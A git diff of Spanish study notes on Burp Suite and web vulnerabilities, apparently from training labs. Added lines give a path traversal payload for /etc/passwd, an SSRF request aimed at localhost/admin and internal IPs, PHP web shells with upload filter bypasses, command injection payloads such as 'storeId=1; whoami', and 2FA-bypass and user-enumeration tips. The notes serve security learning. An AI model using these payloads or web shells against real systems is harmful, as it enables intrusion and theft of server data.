@@ -14,11 +14,32 @@ Burp Suite es una herramienta esencial para el análisis de seguridad de aplicac
 
 ### Path Traversal
 Permite al atacante aceder a archivos que no deberia. Por ejemplo `https://insecure-website.com/loadImage?filename=../../../etc/passwd` permitiria acceder a `/var/www/images/../../../etc/passwd` que daria lugar a que se accediese en realidad a `/etc/passwd`.
+
+### Autenticacions y autorizacion
+- Autenticacion es que sea quien dice ser, autorizacion que tenga permisos de hacer algo.
+
+### Trucos
+- Es posible eludir el 2FA cuando la verificación se realiza en una página distinta.
+- En robots txt se puede encontrar informacion sobre partes prohibidas.
+- Se pueden modificar las cookies en los responses request, o en el inspector->aplications.
+- AL intentar adivinar usuario, si acertamos: el mensaje de error o codigo puede ser distinto. si la contrasenia es mas larga puede demorar mas en caso de que el usuario exista.
+
 ### SSRF
+- La falsificación de solicitud del lado del servidor (Server-side request forgery o SSRF) es una vulnerabilidad de seguridad web que permite a un atacante hacer que una aplicación del lado del servidor realice solicitudes a una ubicación no deseada, pudiendo conectar con servicios internos o externos y filtrar datos sensibles, como credenciales de autorización.
+- Ejemplo: `POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
 
-- Se puede eludir la autenticación de dos factores (2FA) si está implementada en una página distinta.
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1`
+Cambiamos la ultima linea por `stockApi=http://localhost/admin`
+Tambien pueden ser de la forma `stockApi=http://192.168.0.X/admin` en cuyo caso hay que explorar en X. El 0 puede ser 1.
 
-### Comandos útiles
+### File vulnerabilities
+- Se puede subir archivo php: `<?php echo file_get_contents('/path/to/target/file'); ?>` o `<?php echo system($_GET['command']); ?>` que luego puede ser `GET /example/exploit.php?command=id HTTP/1.1`
+- Se puedden subir cambiando el content type en el request por `image/jpeg` o `image/png` (mandandolo a repetidor)
+
+### OS commandd injection
+#### Comandos utiles
 | Propósito del comando        | Linux    | Windows         |
 |------------------------------|----------|-----------------|
 | Nombre del usuario actual    | `whoami` | `whoami`        |
@@ -27,12 +48,9 @@ Permite al atacante aceder a archivos que no deberia. Por ejemplo `https://insec
 | Conexiones de red            | `netstat -an` | `netstat -an` |
 | Procesos en ejecución        | `ps -ef` | `tasklist`      |
 
-#### Bypassing 2FA
-- Es posible eludir el 2FA cuando la verificación se realiza en una página distinta.
-
-#### Uso de la línea de comandos para testing
+##### Uso de la línea de comandos para testing
 - Ejemplo de comando: `stockreport.pl 381 29` en línea de comandos para acceder al stock.
-  - Payload de ejemplo: `productId=1&storeId=1|whoami`. Si se ejecuta desde terminal, este payload puede ser procesado sin mayores restricciones.
+  - Payload de ejemplo: `productId=1&storeId=1; whoami`. Si se ejecuta desde terminal, este payload puede ser procesado sin mayores restricciones. ; o & o &&
 
 ### Detección de vulnerabilidades de inyección SQL
 
